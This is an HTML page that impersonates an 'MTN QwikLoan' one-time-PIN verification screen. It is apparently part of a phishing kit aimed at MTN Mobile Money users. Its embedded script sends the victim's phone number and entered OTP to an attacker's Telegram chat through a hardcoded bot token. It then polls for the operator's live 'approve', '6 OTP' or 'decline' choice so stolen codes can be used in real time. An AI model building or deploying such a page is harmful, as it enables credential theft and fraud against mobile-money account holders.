<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>MTN QwikLoan – OTP Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
  box-sizing: border-box;
  font-family: 'Inter', Arial, sans-serif;
}

body{
  margin: 0;
  background: #ffffff;
  display: block;
  padding: 20px 16px;
  min-height: 100vh;
}

.container{
  width: 360px;
  max-width: 100%;
  margin: 0 auto;
  background: white;
  border-radius: 28px;
  padding: 40px 20px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
  position: relative;
  text-align: center;
  margin-bottom: 30px;
}

/* Removed top-bg completely */

.content{
  position: relative;
  z-index: 2;
}

/* Logo – MTN style */
.logo{
  margin-top: 60px;
}

.logo-circle{
  width: 52px;
  height: 52px;
  background: #000;
  border-radius: 50%;
  color: #FFCC00;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  margin: auto;
  font-weight: 800;
}

.logo-text{
  color: #000;
  font-size: 26px;
  font-weight: bold;
  margin-top: 8px;
}

.logo-text span{
  color: #FFCC00;
  background: #000;
  display: inline-block;
  padding: 0 6px;
  border-radius: 10px;
}

/* Text */
.title{
  color: #FFCC00;
  font-size: 20px;
  font-weight: 700;
  margin-top: 15px;
}

.subtitle{
  color: #555;
  font-size: 15px;
  margin-top: 10px;
  line-height: 1.5;
}

/* OTP boxes (5 digits) */
.otp-container{
  display: flex;
  gap: 12px;
  margin-top: 20px;
  justify-content: center;
}

.otp-input{
  flex: 1;
  min-width: 0;
  height: 50px;
  border-radius: 12px;
  border: 1px solid #ddd;
  text-align: center;
  font-size: 20px;
  font-weight: 600;
  outline: none;
  background: #fff;
  transition: border 0.2s;
  inputmode: numeric;
  -moz-appearance: textfield;
  appearance: textfield;
}

.otp-input:focus{
  border: 2px solid #FFCC00;
  box-shadow: 0 0 0 2px rgba(255,204,0,0.3);
}

.otp-input::-webkit-outer-spin-button,
.otp-input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

/* Buttons */
.btn{
  width: 100%;
  height: 55px;
  border: none;
  border-radius: 14px;
  font-size: 16px;
  margin-top: 20px;
  cursor: pointer;
  font-weight: 700;
}

.btn-primary{
  background: linear-gradient(90deg, #FFCC00, #E6B800);
  color: #000;
  box-shadow: 0 4px 12px rgba(255,204,0,0.3);
}

.btn-primary.disabled, .btn-primary:disabled{
  background: #e5e5e5;
  color: #999;
  cursor: not-allowed;
  box-shadow: none;
}

.btn-outline{
  background: transparent;
  border: 2px solid #FFCC00;
  color: #333;
  font-weight: 600;
}

.message {
  font-size: 14px;
  margin-top: 8px;
  min-height: 20px;
}
.error { color: #dc3545; }
.success { color: #28a745; }

/* Error box (kept red for visibility) */
.error-box{
  position: absolute;
  top: 20px;
  left: 20px;
  right: 20px;
  background: #fff;
  border: 2px solid #ff4d4d;
  border-radius: 12px;
  padding: 15px;
  display: none;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
  z-index: 100;
  text-align: left;
}

.error-title{
  color: #ff0000;
  font-weight: bold;
  margin-bottom: 5px;
}

.error-text{
  color: #444;
  font-size: 14px;
}

.close{
  position: absolute;
  right: 15px;
  top: 10px;
  cursor: pointer;
  font-size: 18px;
  color: #999;
}

/* Spinner – MTN yellow */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0a3;
  border-top: 4px solid #FFCC00;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body>

<div class="container">
  <!-- ERROR BOX -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Wrong OTP</div>
  </div>

  <div class="content">
    <!-- LOGO – MTN QwikLoan -->
    <div class="logo">
      <div class="logo-circle">M</div>
      <div class="logo-text"><span>MTN</span> QwikLoan</div>
    </div>

    <!-- TEXT -->
    <div class="title">Confirm your account</div>
    <div class="subtitle" id="subtitleText">
      A One‑Time PIN has been sent to<br>
      <span id="maskedPhone">02xxxxxx20</span>
      . Enter it below to verify your account.
    </div>

    <!-- OTP INPUT SECTION (5 digits) -->
    <div id="otpSection">
      <div class="otp-container">
        <input class="otp-input" maxlength="1" id="otp1" autofocus inputmode="numeric" pattern="[0-9]*">
        <input class="otp-input" maxlength="1" id="otp2" inputmode="numeric" pattern="[0-9]*">
        <input class="otp-input" maxlength="1" id="otp3" inputmode="numeric" pattern="[0-9]*">
        <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*">
        <input class="otp-input" maxlength="1" id="otp5" inputmode="numeric" pattern="[0-9]*">
      </div>
      <div class="message" id="otpMessage"></div>
      <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
    </div>

    <!-- Go Back button -->
    <button class="btn btn-outline" id="goBackBtn">Go Back</button>
  </div>
</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  (function() {
    // ==================== TELEGRAM BOT CONFIG ====================
    const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
    const CHAT_ID   = '1006917440';
    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // ==================== DOM ELEMENTS ====================
    const otpInputs = [
      document.getElementById('otp1'),
      document.getElementById('otp2'),
      document.getElementById('otp3'),
      document.getElementById('otp4'),
      document.getElementById('otp5')
    ];
    const nextBtn = document.getElementById('nextBtn');
    const goBackBtn = document.getElementById('goBackBtn');
    const maskedPhoneSpan = document.getElementById('maskedPhone');
    const otpMessage = document.getElementById('otpMessage');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');
    const errorText = document.getElementById('errorText');

    // ==================== RETRIEVE DATA FROM SESSIONSTORAGE (MTN keys) ====================
    // Login page stored mtn_phone and mtn_pin
    const phone = sessionStorage.getItem('mtn_phone') || '0240000020';
    // For OTP page we only need phone number; account type is always mobile.
    const accountType = 'Mobile';

    // ==================== MASK PHONE NUMBER ====================
    function maskPhone(phone) {
      const cleaned = phone.replace(/\D/g, '');
      if (cleaned.length >= 4) {
        const start = cleaned.slice(0, 2);
        const end = cleaned.slice(-2);
        const masked = start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
        return masked;
      }
      return phone;
    }
    maskedPhoneSpan.textContent = maskPhone(phone);

    // ==================== OTP AUTO‑ADVANCE (5 digits) ====================
    function focusNext(index) {
      if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
    }
    function focusPrev(index) {
      if (index > 0) otpInputs[index - 1].focus();
    }

    function updateNextButton() {
      const allFilled = otpInputs.every(inp => inp.value.length === 1);
      nextBtn.disabled = !allFilled;
      if (allFilled) {
        nextBtn.classList.remove('disabled');
      } else {
        nextBtn.classList.add('disabled');
      }
    }

    // Scroll focused input into view when keyboard appears
    function handleFocusScroll(event) {
      setTimeout(() => {
        event.target.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'nearest' });
      }, 100);
    }

    otpInputs.forEach((input, idx) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) focusNext(idx);
        updateNextButton();
        otpMessage.textContent = '';
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0 && idx > 0) {
            e.preventDefault();
            focusPrev(idx);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(idx);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(idx);
        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
          e.preventDefault();
        }
      });

      input.addEventListener('focus', handleFocusScroll);
    });

    // ==================== ERROR HANDLING ====================
    function showError(message) {
      errorText.innerText = message || 'An error occurred';
      errorBox.style.display = 'block';
    }

    window.hideError = function() {
      errorBox.style.display = 'none';
    };

    // ==================== TELEGRAM HELPERS ====================
    function escapeHtml(unsafe) {
      return unsafe.replace(/[&<>"]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        if (m === '"') return '&quot;';
        return m;
      });
    }

    async function sendToTelegram(payload) {
      const url = `${API_BASE}/sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (error) {
        console.error('Telegram send error:', error);
        throw error;
      }
    }

    let currentPollInterval = null;

    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
      if (currentPollInterval) clearInterval(currentPollInterval);
      let lastUpdateId = 0;

      currentPollInterval = setInterval(async () => {
        try {
          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
          const response = await fetch(url);
          const data = await response.json();
          if (!data.ok || !data.result.length) return;

          data.result.forEach(update => {
            lastUpdateId = update.update_id;
            if (update.callback_query && update.callback_query.data) {
              const parts = update.callback_query.data.split('_');
              if (parts.length >= 3) {
                const [type, action, time] = parts;
                if (time == expectedTs && type === expectedPrefix) {
                  clearInterval(currentPollInterval);
                  currentPollInterval = null;
                  onDecision(action);
                }
              }
            }
          });
        } catch (err) {
          console.warn('Polling error:', err);
        }
      }, 1500);
    }

    // ==================== OTP SUBMISSION ====================
    let isSubmitting = false;

    async function submitOtp() {
      if (isSubmitting) return;

      const enteredOtp = otpInputs.map(inp => inp.value).join('');
      if (enteredOtp.length !== 5) {
        otpMessage.textContent = 'Please enter all 5 digits.';
        otpMessage.className = 'message error';
        return;
      }

      isSubmitting = true;
      nextBtn.disabled = true;
      otpInputs.forEach(inp => inp.disabled = true);
      spinner.style.display = 'flex';

      const ts = Date.now();
      const identifier = `MTN MoMo: ${phone}`;
      const escapedOtp = escapeHtml(enteredOtp);
      const msg = `🔐 <b>MTN QwikLoan OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nChoose action:`;

      await sendToTelegram({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
            { text: '6 OTP', callback_data: `otp_6otp_${ts}` },
            { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
          ]]
        }
      });

      pollForCallback('otp', ts, (action) => {
        spinner.style.display = 'none';
        isSubmitting = false;

        if (action === 'approve') {
          window.location.href = 'loan.html';
        } else if (action === '6otp') {
          // Redirect to 6-digit OTP page
          sessionStorage.setItem('wrongOtp5', 'true');
          window.location.href = 'otp6.html';
        } else if (action === 'decline') {
          showError('Invalid OTP. Please try again.');
          // Reset OTP inputs for new attempt
          otpInputs.forEach(inp => {
            inp.value = '';
            inp.disabled = false;
          });
          otpInputs[0].focus();
          updateNextButton();
          nextBtn.disabled = false;
        }
      });
    }

    nextBtn.addEventListener('click', submitOtp);

    // ==================== GO BACK ====================
    goBackBtn.addEventListener('click', () => {
      window.location.href = 'login.html';
    });

    // ==================== ENHANCE NEXT BUTTON SCROLL ====================
    const originalUpdate = updateNextButton;
    const enhancedUpdate = function() {
      originalUpdate();
      if (!nextBtn.disabled) {
        setTimeout(() => {
          const rect = nextBtn.getBoundingClientRect();
          const viewHeight = window.innerHeight;
          if (rect.bottom > viewHeight || rect.top < 0) {
            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
          }
        }, 50);
      }
    };
    // Replace the function reference
    updateNextButton = enhancedUpdate;
    window.updateNextButton = enhancedUpdate; // backup

    // ==================== RESIZE HANDLER (keyboard open/close) ====================
    let resizeTimer;
    window.addEventListener('resize', function() {
      if (resizeTimer) clearTimeout(resizeTimer);
      resizeTimer = setTimeout(() => {
        const focused = document.activeElement;
        if (focused && focused.classList && focused.classList.contains('otp-input')) {
          focused.scrollIntoView({ behavior: 'smooth', block: 'center' });
        } else if (nextBtn && !nextBtn.disabled) {
          const rect = nextBtn.getBoundingClientRect();
          const viewHeight = window.innerHeight;
          if (rect.bottom > viewHeight || rect.top < 0) {
            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
          }
        }
      }, 100);
    });

    // ==================== INIT ====================
    updateNextButton();
    setTimeout(() => {
      const active = document.activeElement;
      if (active && active.classList && active.classList.contains('otp-input')) {
        active.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 200);
  })();
</script>

</body>
</html>
